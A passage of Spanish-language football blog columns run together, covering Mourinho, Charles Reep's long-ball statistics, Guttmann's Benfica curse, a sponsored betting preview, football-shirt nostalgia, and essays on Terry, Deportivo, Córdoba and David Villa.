humanos del Real Madrid. Ocho meses después con el muñeco reemplazado, tal y como perseguían los tunos molestos, la murga alrededor del banquillo madridista ni ha cesado ni tiene visos de cesar. Sustituyan Pellegrini por Mourinho y bilis por confitura fina. Leer la entrevista de hoy al central Pepe y darme la razón es todo uno. Si tienen un ratito hagan cuentas y verán que de las 38 preguntas al futbolista, 15 están planteadas como halago al actual entrenador del Madrid. Que mitad de la entrevista tan sólo sirve para dorar la píldora a un tercero.Lean alguna de ellas. ¿ Es beneficioso tener un entrenador tan mediático, que carga la presión de la prensa sobre sus espaldas? (…) ¿Se atrevería Mourinho a hacer lo mismo (el castigo a Pedro León) con Cristiano, por ejemplo? (…) ¿Qué hay de cierto en que con Mou los entrenamientos son una batalla para hacerse con el puesto? (…) Vamos, que con Mourinho no hay titulares ni suplentes (…) ¿Ven las ruedas de prensa de Mourinho y las comentan en el vestuario? Y mi favorita, la que resume el tono de este ejercicio de genuflexión ¿Es (Mourinho)el mejor técnico que tenido en su vida? Tal parece que quieran demostrar que antes del advenimiento del salvador no existía el fútbol. Que existe una era d. M, después de Mou, en el fútbol español. Con este periodismo a favor de obra Florentino Pérez podrá desayunar contento todos los días pero al resto nos comienza a empachar bastante el menú. “Más del 80% de los goles resultan tras jugadas de tres pases o menos” Charles ReepLeyendo el artículo que sobre Gaizka Toquero, ese genio de la transpiración, ha escrito esta mañana mi compañero Borja Barba me entretuve imaginando a la anomalía rezándole a una estampita de Charles Reep antes de cada faena. Sería lo suyo teniendo en cuenta que el Comandante Reep es, palabras mayores, el tipo al que los ingleses atribuyen la invención del juego largo. Thorold Charles Reep (1904-2002) fue contable y aviador y aparte de servir a la patria en el aire gustó de hacer lo mismo en el fútbol tamizando el juego a través de la estadística. Salvando las distancias y para entendernos fue un Mister Chip de la época. Y a través de su estudio este “Johnny 5” futbolero concluyó que lo ideal para salir vencedor en los asuntos de la pelotita era marearla lo menos posible. Fue el padre del kick and rush.Desde el 18 de marzo de 1950 y durante 30 años Charles Reep entregó su vida a la comprensión del juego a través del estudio estadístico. Inspirado por el estilo metalúrgico que impuso Herbert Chapman al frente del Arsenal Reep se pasó la vida acorazando con números aquello de que el balón a la olla es la manera más sencilla de encontrar el gol. Fue el asesor en la sombra cuando el Wolverhampton impuso su ley en los 50 y guió el pensamiento de varias generaciones de entrenadores. Tal era su convencimiento en las bondades del patadón que incluso llegó a redactar un artículo desmitificando la legendaria victoria de la irresistible selección húngara de 1950 en Wembley. Vamos, un titán de lo retrobalompédico. . Pero ¿Realmente influyó tanto Reep en el modo de jugar? Definitivamente sí y baste señalar que el manual de entrenadores de la Federación Inglesa escrito por Charles Hughes en 1980 y replicado en 11 ocasiones desde entonces bebe directamente de la filosofía Reep. Visto lo visto no sería descabellado que los ingleses, aficionados como son a fundar todo tipo de clubes dedicados a la conservación de las costumbres al punto de reunirse en cuchipanda para replicar antiquísimas recetas de mermelada casera, fundasen la “Sociedad para la Conservación del Juego Largo”. Presidiría el salón, imagino decorado en ese kitsch inglés que tanto nos pierde a los continentales, una foto del viejo aviador.El nacimiento de la Premier League, con el desembarco de entrenadores y jugadores extranjeros que conllevó, han transformado el juego en gran medida pero cada vez que la selección inglesa tropieza, cosa común más o menos en cada campeonato, los numeritos de Reep sobrevuelan el análisis. “La paciencia y la posesión son mitos. Los goles vienen de errores” dijo uno de  los acólitos a su primigenio credo, Graham Taylor, mientras Inglaterra hacía las maletas en el Mundial 82. 20 años después de aquello, con el Comandante Reep ya criando malvas, un tal Sven Goran Eriksson instruía a los periodistas en rueda de prensa camino del Mundial 2002. “Si miras las estadísticas de los grandes clubes o selecciones, más del 80% de los goles llegan tras menos de cinco pases” ¿Les suena? Tras meses glotoneando estamos liquidando el menú y a punto de recibir uno de los postres más apetecibles de la temporada. El desenlace del torneo resucitado se sirve en Dublín y tiene un acusado sabor portugués. En el Dublín Arena (arena casualmente similar en forma y color a ese otro icono luso que es el Alvalade) pelearán Oporto y Sporting de Braga en lo que es la anomalía, con mayúsculas, más feliz de los últimos años en el fútbol portugués.Y por eso, una y otra vez, necesitamos ser Grecia, y el Forest y el Alavés, y que el tiro de Smicer entre y ponga el 3-2, y que el Recre firme un 0-3 en el Bernabéu y el Barça se coma cinco en Santander’. Para sustentar nuestra fe, necesitamos creer que las cosas pueden ser de otra manera. Que no hay un orden establecido inquebrantable. Que la tiranía es reversible y que no siempre tienen que hincar la rodilla los mismos. Que la historia esta del fútbol, en definitiva, no tiene siempre el final escrito.Puedes comprar camisetas del Leicester City en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. ‘Sus segundos años siempre son los mejores, porque ya nos conocemos mejor‘. Ricardo Carvalho podía presumir de conocer bien a José Mourinho. Llave maestra en su Oporto campeón de Europa, lugarteniente imprescindible en su primera etapa en Stamford Bridge y comodín de plena confianza en sus tumultuosos años en Madrid, el defensa portugués tenía muy claro que en los esquemas de trabajo del técnico de Setúbal la curva de rendimiento alcanzaba su plenitud en la segunda de sus temporadas al frente de un club. No es menos cierto que la realidad ha venido demostrando regularmente que la máxima lanzada por Carvalho se apoya sobre unos cimientos sólidos. Brillante fue su segunda temporada (completa) en Oporto, con la inesperada conquista de la Liga de Campeones, en su primera etapa en Londres, alzándose campeón de la Premier League por segundo año consecutivo y ante rivales reforzados y advertidos de su presencia, en su paso por el Inter, llevándose a la saca liga, copa y Champions League, o ya por último en Madrid, arrebatando la supremacía en liga al intocable Barça al sumar la cifra récord de cien puntos.De vuelta en Londres, con más canas, la media sonrisa socarrona cada vez más tendente al histrión y cierto aire de crooner rompecorazones, José parece destinado a seguir cimentando la leyenda de sus segundos años. Tras una primera temporada en la que superada la lógica exaltación propia del esperadísimo regreso demasiadas sombras enturbiaron su trayectoria, su segundo año al frente del Chelsea parece estar cumpliendo con las expectativas tradicionales. El técnico parece haber sentado las bases necesarias en un primer curso en el que las polémicas, suscitadas sobre todo por las salidas y entradas de futbolistas en la plantilla, se sucedían cada mes. Ocurrió con David Luiz, al que quiso vender pero después decidió quedarse como alternativa a Cahill y al protegido Terry. O con Romelu Lukaku, ese eterno ‘sí pero no’ cuya salida del Chelsea rara vez llegaremos a comprender en su totalidad. También con Juan Mata, a quien afeó en público su actitud en los entrenamientos para terminar mostrándole la puerta de salida del club cinco meses después de su llegada al Bridge. Incluso la llegada de Nemanja Matic en el mercado de invierno, abonando al Benfica veinte millones de libras por un jugador que dos años atrás había salido de la disciplina Blue, estuvo rodeada de polémica con la densa sombra de Jorge Mendes, en descarada simbiosis con su compatriota, sobrevolando la escena.Sea como fuere, aun refunfuñando como es costumbre en la casa, Mourinho terminó de redondear su tablero y ciñó su plan al guión que mejor domina. Se deshizo de lo que no quería o de aquello a lo que no estaba convencido de poder sacar rendimiento (Torres o Lampard incluidos) y se hizo rodear de aquellas piezas que perfeccionaban la versión 2.0 de su invento (Costa, Rémy, Drogba, Courtois…) y le permitirían extraer toda la leche de la vaca. Además, en su táctica, redujo la densidad de conflictos latentes en torno al equipo, recuperó la estima perdida en los primeros doce meses tras su retorno y acabó con el escepticismo que parecía haber generado en el palco del Bridge gracias a la consecución de un resultado positivo tras otro. Ganar a los grandes, a aquellos con los que supuestamente te vas a jugar los títulos, siempre glorifica y permite al triunfante protagonista señalar una muesca más en el revólver. Con más de un tercio de la temporada consumido, no cabe duda ya de que este Chelsea, que camina con paso firme y decidido tanto en la Premier League como en la Champions League, es de los de segundo año. Un equipo de autor. En las horas previas a la tercera final europea del Sevilla FC en los últimos ocho años, nadie habla del Benfica. O, al menos, no elogiando sus méritos. Da igual que el equipo dirigido por Jorge Jesús esté a punto de completar la mejor temporada de su historia más reciente tras recuperarse anímicamente del demoledor fiasco de la temporada anterior. Parece no importar en exceso el fantástico momento de futbolistas como Lima (mal recuerdo en el Pizjuán del exdelantero del Braga), Ezequiel Garay, Luisao o el hispanobrasileño Rodrigo. Ni siquiera el muy reciente y meritorio hecho de haber eliminado a la favoritísima Juventus en la semifinal del torneo parece recibir la atención y el reconocimiento debidos.En las horas previas a la tercera final europea del Sevilla FC en los últimos ocho años, nadie habla del Benfica, pero todo el mundo tiene presente a Béla Guttmann, el técnico que llevó al cuadro lisboeta a firmar las páginas más brillantes y recordadas de toda su historia, al levantar la Copa de Europa dos campañas consecutivas, en 1961 y 1962. Peculiarísimo en su manera de entender las relaciones contractuales, el estratega húngaro de origen judío sentó cátedra en la muy abultada cifra de dieciocho clubes durante veintidós temporadas. No eran los clubes. No eran las directivas. No era ni siquiera la ausencia de títulos. Era él. “Durante el primer año en un club, el entrenador puede trabajar tranquilamente. El segundo año ya es más complicado. El tercero suele ser un error fatal“. Los ciclos de Guttmann acostumbraban, pues, a ser muy breves e intensos. De hecho, fue precisamente el Benfica el único club en el que el técnico húngaro permaneció tres temporadas seguidas (más una temporada más en una segunda etapa en Da Luz), lo que no supuso un especial miramiento a la hora de pegar un sonoro e histórico portazo en su adiós al club lisboeta.Días después de alzar al cielo de Amsterdam la segunda Copa de Europa de su carrera y de la historia del Benfica, tras imponerse con contundencia por cinco goles a tres al Real Madrid de Di Stéfano y Puskás, Béla Guttmann se vio en una posición de privilegio para ir a reclamar un aumento de sueldo a la directiva portuguesa. Sin embargo, la negativa que obtuvo por respuesta terminó precipitando su inesperado adiós al equipo al que había logrado convertir en un grande de Europa en apenas un trienio. “Pasarán cien años desde el día de hoy hasta que el Benfica pueda volver a ganar una Copa de Europa“. Y han pasado, de momento, cincuenta y dos. Y hasta cinco finales de Copa de Europa (siete si contamos todos los torneos continentales). Ninguna. Ni las tres que llegaron posteriormente en la brillante década de los años sesenta, ni la del 88 ni la del 90. En todas ellas dobló la rodilla el Benfica y en todas ellas se recordó la maldita sentencia de Guttmann. Por mucho que este Benfica de Jorge Jesús huela a éxito, por mucho que su favoritismo sea evidente, en Turín serán miles los sevillista a que tengan muy presente al mítico técnico húngaro.Al postbenitecismo. A inventar un nuevo milagro casa semana para olvidar que la Liga está perdida y que la Champions se va a tener que sudar. Los mediocentros defensivos como respuesta a todas las preguntas, como un mapa del tesoro en la buhardilla, como el punto de apoyo que hará moverse al mundo. Sigamos aplaudiendo la normalidad, haced como que estamos en un debate de investidura. Ganar me entristece. Ganar es un ejercicio melancólico. Tras la victoria sólo queda un paraje muerto. Es caprichosa la naturaleza del ser humano, esa carne literaria que es la nada que sucede al éxito. Apenas me acuerdo ya de la Champions que ganó el Madrid. Y no es por el Mundial, ni por nuestros pequeños equipos con sus pequeñas gestas. Es otra cosa. Es una melancolía milimétrica, fría como la mano de un vecino. Hoy al ver la nueva camiseta rosa del Madrid he sentido algo desasosegante. No por el color, no por la camiseta de hecho, sino por todo lo que rodea a este deporte. Donde los éxitos se deshacen rápido. Donde lo vulgar sucede a lo extático. No hay nada más instantáneo, fugaz y caprichoso que el fútbol. Del gol de Ramos a la camiseta rosa, del cabezazo de Bale al hipotético fichaje de Pogba apenas hay un paso. Del arrobamiento de la victoria a la cotidianidad aburrida del club en un solo parpadeo. Deseo cosas irrealizables. Deseo parar el tiempo y recrearme ridículamente en un momento. Pasa con el amor también. Que uno siempre quiere congelar el beso y dejar de vivir la despedida. El fútbol es una sucesión de hechos intrascendentes. Quiero pensar que vestirse tras el sexo es parte del sexo también. Pero no me sale. Por eso arrastro este bajón como de borrachera mal llevada. Las películas, los buenos libros, te acompañan siempre. Te enseñan, te animan, te dan claves para entender el futuro. El fútbol, sin embargo, no sirve para nada. Es hermoso pero está hueco. Tras el gol de la victoria no hay lectura trascendente, no hay lección de vida, sólo un grito enajenado y después la nada. Conquistar Lisboa para construir la ausencia. Empiezo a pensar que ganar es peor que perder. Que es en las derrotas donde pasan cosas. Que sólo tocando el suelo con la mejilla uno puede entender el fútbol. Si de algo me arrepiento en esta vida es de haber elegido, de pequeño, un equipo ganador. Sólo la tragedia conmueve. Los héroes sólo son héroes cuando dejan de serlo, cuando caen en el olvido. Yo soy de lo que duele. ¿Por qué el Madrid y no la nada? Hay dos tipos de personas: los que aman el fútbol y los que lo odian. Yo estoy en medio.He intentado explicarlo lo mejor posible. Seguro que muchos madridistas que me leen piensan algo parecido. Qué queda ahora. Qué queda tras llegar a lo más alto. Supongo que bajar. Y bajar puede ser también divertido. Bajar mucho. Bajar hasta tocar fondo. Bajar tanto que volvamos a fichar a Faubert. Bajar tanto que podamos oir a Floro gritando en un vestuario. Bajar allí donde no se gana nada.Podemos hacer eso. O esperar. Esperar en este espacio desocupado que es la victoria. En esta tierra baldía que Eliot no tendría valor de explicar. Ganar es aburrido. Y lo digo ahora, porque hemos ganado. Cada semana, y de la mano de bwin, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. Esos aficionados elegantes que sufren el Síndrome de Stendhal viendo el juego de toque, fino, de balones al pie, de paredes interminables, de conducción hasta la misma línea de gol, de asociación, de colectivo frente a individualidad… deben ponerse muy nerviosos cuando las bolitas del bombo anuncian un enfrentamiento entre Barcelona y Arsenal. El equipo catalán es un maestro del juego preciso y plural, el equipo londinense un alabado intento Made in England de reproducir el eléctrico –y eficaz- juego de los azulgrana.Wenger y Guardiola saben a qué juegan cuando disponen su once sobre el césped. No hay plan B, el manual de uso de sus plantillas está expuesto claramente: posesión de balón, juego al pie desde el portero hasta el nueve, líneas muy juntas, laterales de largo recorrido, presión en la salida del contrario, solidaridad antes que individualidad. Con esas trazas unos han conseguido, posiblemente, ser el mejor equipo de la historia y los otros ser un oasis de plasticidad en el habitualmente árido fútbol británico. Mañana se juegan su pase a los cuartos de final de la Liga de Campeones. Los gunners llevan ventaja desde la ida pero nada más echar un vistazo a las apuestas vemos que pocos creen que la eliminatoria esté ya finiquitada.Este partido abierto viene marcado por las bajas. Mucho talento en camilla o la grada para un encuentro que pretende ser un exquisito plato para el aficionado. El Barça tendrá muy mermada su línea de contención y el Arsenal su línea de ejecución. Ausencias detrás y ausencias delante en un azaristico equilibrio entre ambas fuerzas. Ante el panorama podemos aventurarnos en afirmar que el verdadero duelo, la clave del partido, se disputará en la zona lumbar del campo. Busquets, Xavi e Iniesta parecen ser fijos, tal vez la inclusión de Keit. Los dos magos secundados por ese infalible picapedrero cuyo valor sigue creciendo partido a partido. El Arsenal, ante la baja de Song, tendrá que confiar quizá en Denilson. Wilshere podrá estar en el campo al igual que Cesc, auténtico Cid Campeador de un equipo al que siempre se le achaca bisoñez y al que el canterano culé dota de pundonor y carácter. Arriba el drama de Wenger es más acusado. Sin Walcott y Van Persie, el francés debe volver a confiar en ese enigma andante llamado Bendtner.El Barcelona también tendrá que improvisar con los centrales, la pareja titular está fuera. Puyol no termina de recuperarse y Piqué no juega por acumulación de tarjetas. En un lado jugará casi seguro Abidal, dejando el carril izquierdo a Maxwell. El otro central puede ser Milito, aunque no es de extrañar que Busquets retrase su posición, cediendo el imperio a Mascherano, con Alves en el flanco derecho. Defensa circunstancial, en cualquier caso, que exigirá un desgaste en las coberturas que puede ser clave para contener a los gunners. Además el Barcelona no puede quedarse a esperar, necesita un gol, con lo que gana la opinión de que será un partido vibrante, abierto, propicio para el espectáculo.Es favorito el Barcelona por honores y juego, aunque la ventaja del Arsenal no debe menospreciarse por más brillo que tengan las botas de los hombres de Pep. bwin.com paga 1.25 € por la victoria del Barcelona y nada menos que 7.75 € por la del Arsenal. Será difícil, pero la cuota está disparada viendo las bajas y los planteamientos algo suicidas que tendrá que aplicar Guardiola para llevarse la imperiosa victoria. Otra cuota curiosa es la que da 20 € por euro apostado en el caso de que el marcador acaba 0-0, casi una locura tratándose de estos dos equipos, pero que es un resultado posible si la puntería, como en la ida, no termina de aparecer. Mi apuesta sería algo descabellada, un 4-0 a favor del Barça pagada a 34 €. Es un marcador fetiche para los de Pep y para mí puede ser la traducción numérica de la superioridad blaugrana sobre los mermados hombres de Wenger. Sólo hay una forma de conocer una ciudad en profundidad: haber tenido una pareja en cada barrio. El portal de su casa, comer helado cerca, pasear a su perro por calles hasta entonces desconocidas. Pasar, al cabo de los años, y conocer cada banco y cada árbol de un espacio que albergó tu amor durante un par de días, un par de meses o un par de años.La ciudad es una colmena fría que sólo se sonroja cuando se asocia al deseo, toma vida si ponemos el dedo sobre la carne de un amante.A un amigo le pasaba algo parecido con los equipos de fútbol. Cada camiseta le recuerda un romance. Cuando de pequeño veraneaba en Torremolinos y ella le esperó en la playa con una enorme camiseta del Málaga que le había prestado su padre. O aquel largo viaje con sus padres a Galicia, un septiembre lluvioso justo antes de empezar el curso, y se enamoró de una chica rubia que iba de la mano de su abuelo a ver un partido del Celta con una bufanda que le daba tres vueltas a su secreto y besuqueable cuello.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Ya más tarde el viaje a Mallorca con el instituto, las chicas con camisetas del Bayern utilizadas como un vestido de verano, sus sandalias, los tobillos glaciares, su acento imposible. El amor de ese año, una sevillana que vivía frente al Sánchez Pizjuan. Sentados en el Pizza Hut de Nervión viendo pasear la marea blanca, besarse a escondidas en la puerta de El Corte Inglés. Después las Erasmus, pedirle a Anne que te trajera una camiseta del Paris Saint-Germain cuando volviera de pasar las Navidades con su familia. Darle el dinero para comprarla porque no había confianza para tanto gasto. Hablarle a una eslovaca de Dubovsky creyendo que con eso ella abriría la puerta de su casa, hacerse hincha del Slovan de Bratislava durante toda una Copa de la UEFA. Buscar el encuentro salvaje con una italiana de Siena que no tenía ni idea de que en su ciudad había un equipo de fútbol que jugaba en primera. Besar a una inglesa borracha en un irlandés mientras Djemba-Djemba pateaba un balón sobre el césped de Old Trafford.El verano en Newcastle para aprender inglés y de paso comprar una adidas de los magpies. Ver con Inma el concierto de Explosions in the Sky en la Moby Dick con la camiseta del Madrid aún puesta justo después de ver ganar a los suyos en el Bernabéu. Seis años de convivencia, celebrar la Eurocopa vestidos de rojo. Colgar banderas en la ventana. Abandonarse después a las noches de una ciudad ilimitada. Enamorarse de una chica de Barcelona tatuada, acompañarla a ver al Barça y disfrutar resignadamente del espectáculo. Regalarle a Miriam una camiseta del Borussia Dortmund en el aeropuerto antes de la despedida, antes de que se marchara a Alemania a trabajar en un laboratorio de nombre impronunciable. Llorar y consolarse viendo la derrota del Chelsea en un bar del centro de Málaga. Aguantar la conversación de una argentina insoportable. Decir que tu equipo preferido es River y saber por su mirada que he perdido la última oportunidad que teníamos de llevármela a la cama.Mirar atrás, ver amontonadas camisetas en un cajón. Buscarle una historia de amor a cada una de ellas. Como las ciudades, con un mapa sentimental de cada calle. Igual en tela. Camisetas deshilachadas que aún huelen a verano, que guardan la sal. Escudos sin color y dorsales borrados.Puedes comprar estas camisetas y cientos más en Classic Football Shirts. Terry es poesía. Una poesía bukowskiana, carveriana, wolfeana. Sucia, de excesos y escarceos, de pringue en las paredes, de camellos, infidelidades, peleas a la salida del pub. Esas cosas que llamaron realismo sucio, la lírica de la cotidianidad. En sus botas se resume el brillo de las grandes ocasiones y el barro de las derrotas. Es un defensa ganador, malencarado, de los que todos queremos tener en nuestro equipo. El Chelsea llegó alto bajo su capitanía, pero el santo John tuvo que vivir en su pellejo uno de los episodios más dramáticos de la historia blue.Llovía en Moscú. Manchester United y Chelsea acabaron empatando a todo. La prorroga fue puro agotamiento. Como en una ruleta rusa, la vida y la muerte en las manos del azar. Los penaltis. Cristiano Ronaldo falló el suyo. Terry, que lanzaba el último de su serie, tenía en sus pies el trofeo. El gol les daba la Champions. Abramovich salivaba como un perro hambriento. Los compañeros de abrazaban. Van der Sar parecía más pequeño enjaulado entre los tres palos, clavado a la línea. El 26 se acercaba al balón, temblando por dentro. Su tiro fue ajustado al palo derecho, pero un resbalón sacrificó la precisión y el cuero estalló contra el poste. El holandés lo celebraba, el inglés se sentaba en el suelo, hundía la cabeza entre las rodillas. Se sabía derrotado.No hay justicia poética que pueda devolver a Terry la felicidad que perdió aquella noche. Hoy tiene la oportunidad de, al menos, intentar echar de la Liga de Campeones al equipo que fue testigo de su peor noche. Los versos de Terry, mundanos, arrítmicos y sin rima, se recitarán hoy sobre el césped de Starmford Bridge. Creo que una de las virtudes del fútbol es su facilidad para el engaño. Su reglamento es flexible, el campo es amplio, los jugadores son numerosos y la sensación de impunidad es bien alta. Es cierto que esos infinitos ojos de vidrio que ahora rodean el césped como notarios mudos que todo lo apuntan han quitado mucha espontaneidad a un deporte que siempre ha vivido con un pie en el honor y otro en la marrullería. Y celebro que así sea, y quizá por eso nos guste tanto.Yo no recuerdo un partido sin patadas, agarrones o engaños. Hace no mucho se puso de moda esa expresión inglesa del fair play. Una conjura de los equipos para dejar los trapos sucios en casa e ir al campo como almas puras en busca de redención y afecto. Evidentemente es sólo una maniobra genuinamente FIFA, es decir, lavado del gato y a tirar.Hay honrosas excepciones. Este vídeo lo es. Los juveniles del Barça se dejan meter un gol a instancias de su técnico, Sergi Barjuan. Cierto que la jugada previa es desafortunada, como se encargó la grada de recordar con sonoros adjetivos, pero las cosas como son. Hay veces en las que uno se olvida de que este es un deporte de barro y rinconeteycortadillismo y se convierte en un tratado de buenas maneras.Por eso le abrimos un hueco en estos anales. El dolor es invisible. Despliega su funesto manto sin alardes, con frialdad, sin fuegos artificiales, con severa e inevitable precisión. Ensombrece los rostros, empuja las lágrimas, convierte en plomo la liviandad de la existencia, nos ancla al suelo. La matemática oposición del vuelo anímico que nos regala el entusiasmo, el revés de ese momento mágico, por ejemplo, cuando gritamos gol solos pero placenteramente acompañados en las gradas del estadio. El dolor es eso que pasa cuando tu equipo desciende. Así de sencillo. Y es difícil aligerar las dudas, hacer breves las sospechas y seguir regalando tiempo, alegría y dinero a un club del que creemos que ya no nos merece.Estuve en A Coruña hace unos días. Era día de partido. En la calle había gente, camisetas listadas de azul y blanco, alcohol en las terrazas y bufandas colgando de los cochecitos de bebé, pero algo olía a cerrado en la calle. Como un baúl que esconde las miserias familiares, como un diario que convierte al héroe en mezquino, al bueno en malo. La ciudad gallega está acostumbrada a la alegría, o al menos, la vacuna Djukic los inmunizó para el sufrimiento doméstico. Estar a punto de bajar era mucho menos dañoso que perder aquella liga. Con eso el Depor ha estado años alternando la gloria con la vulgaridad, pero siempre en un ambiente fértil, despreocupado, confiado y permisivo con la actitud –puntualmente indefendible- de Lendoiro y el desfile de entrenadores y jugadores que han convertido al SuperDepor en un equipo de media tabla con una historia breve en la élite breve pero maravillosa.La ciudad se presta a eso. A ese maridaje entre fútbol y vida que convierte este deporte en algo realmente único. Sin embargo, la caída al pozo de la Segunda División el año pasado ha acabado con ese somnoliento clima de satisfacción y lo ha venido a sustituir por una membrana gris de indignación y hartazgo. Este fin de semana se enfrentan al Córdoba para intentar engancharse a la cabeza de la tabla. Oltra no da con la alineación perfecta en una plantilla que puede presumir de quilates en una categoría que siempre tiende al pragmatismo. Tres derrotas en ocho partidos no son un presagio de rápido retorno.No en vano es la primera ocasión en que dos clubes del país han sabido ganarse el derecho a pelear, frente a frente, por un título continental. 50 kilómetros de distancia, los que separan a Oporto de Braga, se estrecharán hoy hasta encontrarse en la capital irlandesa. Es la final de la UEFA Europa League.Motor americano. “Es curioso porque lo que ha pasado este año no representa la realidad del fútbol portugués. Las estructuras que hay no acompañan la calidad de sus jugadores y de sus técnicos… un viejo problema político” Al aparato para las grabadoras de El País, Jesualdo Ferreira, que algo sabe sobre lo que se cuece en la liga lusa. ¿Cómo se explica el éxito entonces? Olvida Jesualdo destacar la única estructura que parece funcionar en Portugal, la de ojeadores y ojo al dato, que diría el Butano, porque es demoledor: entre Braga y Oporto suman 28 futbolistas sudamericanos en sus filas. Los que relucen son Hulk y Falcao en el Oporto pero casi todos, ahí están Lima o Alan en el Braga, son determinantes.Hazaña. Que el Braga vaya a jugar su primera final continental es un acontecimiento que justifica la velada. A gran nivel  ya en la previa y fase de grupos de Champions, los de Domingos han ido saltando obstáculos con la naturalidad del mejor vallista.El equipo no funciona, pocos goles y un juego deslavazado, sin profundidad y con una falta de talento que ni siquiera Valerón puede maquillar.No es nuevo, hay mucha tristeza en la Liga Adelante, muchos equipos que han quedado hundidos en la brea del fútbol. El Tenerife acaba de despeñarse, como hace nada el Cádiz. Malviven Nastic, Recre, Celta, Murcia y Xerez, que hace poco recibían en su hogar a los distinguidos “clubes mayoritarios”. Más difícil que jugarla, esta categoría es difícil de entender. Asumir que el único éxito es retomar del lugar donde caíste es una sensación devastadora. Todo eso flotaba en el aire coruñés. O quise sentir mientras veía pasar a mi lado a cientos de aficionados partidos entre la pasión y el desasosiego. “La puta mierda” es una reflexión existencialista con tanta hondura como una novela de Albert Camus o una película de Terrence Malick. Para qué decir más, pudiendo decir menos. Economía de la desdicha y el lenguaje. Hundidos en el sofá como en un videoclip de The Cure, la tarde nos devora partido a partido. Los aficionados al fútbol sabemos que, al elegir los colores, firmamos un contrato con el diablo en un cruce de caminos. El diablo es nuestro club. Nuestro club que es todo de sombras y de unas pocas luces que chispean a lo lejos en la profundidad de la cueva. “La puta mierda” resume alegrías y tristezas en una balanza trascendental de mecanismo imposible. Ver como el balón, ese músculo sentimental de cuero brillante, se aferra a la línea de cal sin entrar aún en la portería. Ver como nuestro delantero estrella no llega al pase en profundidad. Ver como el portero saca una mano que es como una medallita milagrosa. Ver como el árbitro para el partido para que atiendan a un rival que pierde tiempo revolcándose por el césped como se revuelcan los perros en el parque sobre las cacas de otros perros. Ver, en definitiva, como el mundo se deshace a mayor velocidad de la esperada, como en una película de monstruos postnucleares gigantes que, ignorando los rascacielos, vinieran a patear los muros de nuestro estadio. “La puta mierda” es que el Córdoba lleve seis partidos seguidos perdiendo en casa, por ejemplo. Que ayer el Albacete, penúltimo clasificado, nos rematara en el último minuto. Que el ascenso se aleje como se alejan los hidropedales en la playa de Huelin; hidropedales que son clubes surcando el horizonte y sumando más victorias que nosotros. No son yates orgullosos los que se alejan, no son hermosas barcas de madera eterna, no son nobles pesqueros con noble tripulación luchando por el futuro de sus hijos, no son hermosos surferos cabalgando la espuma como adonis de sal. No. Son malditos hidropedales de plástico descolorido los que se van, los que nos dejan en tierra, embarcaciones de puta mierda movidas apenas por el pedaleo turístico y perezoso. Esos que se lanzan a las olas de Primera mientras nos quema la arena en los pies y nos pica el sol en los hombros. Esa es “la puta mierda” a la que me refiero, la de una existencia condenada al paladar binario, tautología del dolor, risas espontáneas; somos cerdos agridulces en nuestro tupper de tapa redonda recorriendo la ciudad en la parte trasera de una moto conducida por un chino.Esta es la vida, lectoras y lectores. Siento haber interrumpido vuestra gozosa existencia tan temprano, en este lunes espinoso que ni con miga podemos tragar. Esta es la vida y no otra, por más que Coca Cola se empeñe en vendernos risas al amanecer o chispas vitales, o H&M moldeando nuestro amor y todas esas parejas amándose en una bahía calmada. La vida es nuestro equipo perdiendo un domingo por la noche. Sacudir tras la derrota las cáscaras de pipas del sofá. Ir a por el recogedor y el cepillo para barrer los restos de la batalla. Esto es la vida y lo demás es accesorio, ni el azúcar a paladas de los refrescos puede quitarnos el sabor a óxido en la boca.Se retiraba ayer Villa entre lágrimas bien justificables después de su partido postrero con la selección, cuando un amigo me envió un whatsapp desde Argentina leyéndome el pensamiento, océano por medio y todo: “¿Te acuerdas de la frase de la Quinta del Buitre?” No es que fuese la misma idea la que rondaba por mi cabeza mientras el cuarto árbitro levantaba el cartelón, es que eran exactamente las mismas palabras las que me retumbaban por dentro, y que extrapoladas, reflejaban a la perfección lo que tanto él como yo pensamos del papel del Guaje en la gran época de la Roja. La Quinta del Buitre son cien goles de Hugo Sánchez.Una nunca sabe cómo recordará la Historia a un equipo o a un futbolista, títulos y consideraciones estadísticas aparte. Trésor fue un genio en su tiempo y hoy no lo conoce casi nadie. Adoramos justificadamente a Mágico y a su Cádiz en el recuerdo, pero mi recuerdo fugaz de niño es que se hablaba  aquellos tipos como la broma amable de la supervivencia anual y la juerga sin fin. Y de aquel Madrid esplendoroso de los ochenta queda su juego alegre y vistoso, los chorros de goles en el Bernabéu,  el potencial icónico de Butragueño, la Copa de Europa que siempre se resistió… y los doscientos mil remates de un mexicano díscolo e indomable que no hizo un regate en su vida, pero que volvió bien palpable todo lo mucho y bueno que se generaba por detrás de él. Quizá, con permiso de Gerd Müller, el goleador más puro y concreto que ha dado el gran fútbol.Si escuchamos el discurso del noventa por ciento de los periodistas y también de muchos aficionados, lo que quedará de la selección triunfante  será su gusto por el juego de toque, posesión y posición, los contrarios rendidos al baile infinito del equipo nacional, y una contribución mayúscula de Xavi e Iniesta, hasta el punto de que en ciertas crónicas parece que los otros nueve han ejercido poco más que de palmeros. Sin negar la parte de verdad que hay en estas afirmaciones y la indiscutible contribución al triunfo tanto del genio de Fuentealbilla como del centrocampista de Terrassa, a servidor le gustaría que alguien en el futuro, al menos, recordase el papel estelar del asturiano en todo lo conseguido. Porque su contribución a todo lo que ha ocurrido estos años está, como mínimo, al nivel de la de cualquier otro, y seguramente por encima. De todos los nueves que durante estos años han vestido la zamarra española, ha sido David Villa quien mejor ha entendido las exigencias especiales del puesto en el heterodoxo sistema de juego español. El juego sutil de control y  pase corto achica los espacios de los delanteros en vez de ampliarlos, y toda una generación de arietes –Negredo, Soldado, Torres, Güiza, y ahora Diego Costa– han sudado sangre para adaptarse a una coyuntura en general muy diferente de la que encontraban en sus clubes, y que con gran frecuencia les ha provocado situaciones de franca incomodidad. Villa, en cambio, con una precisión en el pase corto y un entendimiento del juego muy superiores al de un delantero centro al uso, siempre encontró la rendija para filtrar el balón necesario, hacer el movimiento justo y largar el disparo preciso que ultimase sin miramientos a la zaga rival. Una joya para los espléndidos pasadores de España, y un martillo para los rivales.Sin embargo, la leyenda de Villa no se construye sólo como el final necesario de ataques enhebrados, largos y en ocasiones incluso premiosos. Muchos de los 59 goles que ha marcado con la selección –un récord que no sé si veremos caer en nuestra vida- no han llegado como consecuencia del 